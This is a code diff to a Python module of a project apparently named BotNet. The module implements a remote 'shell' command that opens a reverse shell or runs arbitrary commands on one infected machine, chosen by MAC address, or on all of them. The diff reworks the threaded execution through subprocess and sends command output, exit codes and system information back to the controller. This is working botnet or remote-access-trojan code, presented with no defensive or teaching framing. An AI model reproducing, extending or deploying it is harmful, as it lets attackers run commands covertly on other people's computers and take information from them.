@@ -7,10 +7,10 @@ import subprocess
 from .. import BotNet, Request
 
 
-@BotNet.default_script(script_version="0.0.1")
+@BotNet.default_script(script_version="0.0.2")
 def shell(request: Request) -> str:
     """
-    `[mac-address] /shell` -> shell session
+    `[mac-address] /shell` -> open shell session
     or
     `[mac-address] /shell [command]`-> run command and exit
 
@@ -19,13 +19,18 @@ def shell(request: Request) -> str:
          `94945035671481 /shell ls .`\n
          `94945035671481 /shell ping google.com -c 10`
         or
-         `/shell ping google.com -c 10` -> run command in all systems"""
+         `/shell ping google.com -c 10` -> run command in all systems
+
+
+    special condition:
+        `/shell cd [path]` -> run python change directory, not run orginal cd command \n
+    """
     engine = request.engine
 
     if len(request.command) > 0:
-        res = _cmd(request.command, engine, timeout=10)
+        res = __runcommand_in_thread(request.command, engine)
         if res != None:
-            engine.send(res)
+            engine.send(res, request.system_info(minimal=True))
         return
 
     repeat = 0
@@ -33,7 +38,7 @@ def shell(request: Request) -> str:
     sleep_time = 2
     exit_code = "TIME_OUT"
 
-    engine.send(f"start reverse shell\nfor EXIT send `exit`", request.system_info())
+    engine.send(f"start reverse shell\nfor EXIT send `\exit`", request.system_info())
 
     while repeat < time_out:
 
@@ -46,12 +51,13 @@ def shell(request: Request) -> str:
             repeat += 1
             continue
 
-        if command[0] == "exit":
+        if command[0] == "\exit":
             exit_code = "0"
             break
 
         else:
-            res = _cmd(command, engine, timeout=4)
+            res = __runcommand_in_thread(command, engine)
+
             if res != None:
                 engine.send(res)
             engine.send(f"{os.getcwd()}=>")
@@ -69,21 +75,6 @@ def _valid_command(command) -> bool:
     return True
 
 
-def _ls(command: list[str]) -> str:
-    if len(command) >= 2:
-        path = command[1]
-    else:
-        path = "."
-
-    try:
-        return os.listdir(path)
-
-    except FileNotFoundError as error:
-        return error
-    except Exception as error:
-        return error
-
-
 def _cd(command: list[str]) -> str:
     if len(command) >= 2:
         path = command[1]
@@ -92,7 +83,7 @@ def _cd(command: list[str]) -> str:
 
     try:
         os.chdir(path)
-        return None
+        return f"current_route: {os.getcwd()}"
 
     except FileNotFoundError as error:
         return error
@@ -100,21 +91,15 @@ def _cd(command: list[str]) -> str:
         return error
 
 
-def _cmd(command: list[str], engine, timeout: int = 4):
-    """Run commands."""
+def __runcommand_in_thread(command: list[str], engine, timeout: int = 6) -> None:
+    """Run commands in thread"""
 
-    if command[0] in ("ls", "dir"):
-        return _ls(command)
-
-    elif command[0] == "cd":
+    # override command cd
+    if command[0] == "cd":
         return _cd(command)
 
-    elif command[0] in ("mkdir", "touch", "rm", "rmdir"):
-        os_result = os.system(" ".join(command))
-        return f'output code "{os_result}"'
-
     else:
-        tread = threading.Thread(target=_runcommand_in_thread, args=[command, engine])
+        tread = threading.Thread(target=_runcommand, args=[command, engine])
         tread.start()
 
         for _ in range(timeout):
@@ -127,12 +112,22 @@ def _cmd(command: list[str], engine, timeout: int = 4):
         return "Your command is running in the background and you will get the results when it is done."
 
 
-def _runcommand_in_thread(command: list[str], engine):
+def _runcommand(command: list[str], engine):
+    """run command by subprocess.getstatusoutput 
+    and send resaults by engine.send method"""
+
     try:
-        result = subprocess.getoutput(" ".join(command))
-        if type(result) == bytes:
-            result = result.decode()
-        engine.send(result)
+        command = " ".join(command)
+        exit_code, result = subprocess.getstatusoutput(command)
+        
+        output = f"""
+- command: {command}
+- exit_code: {exit_code} 
+- result:
+{result}
+        """
+        
+        engine.send(output)
 
     except Exception as e:
         engine.send(e)
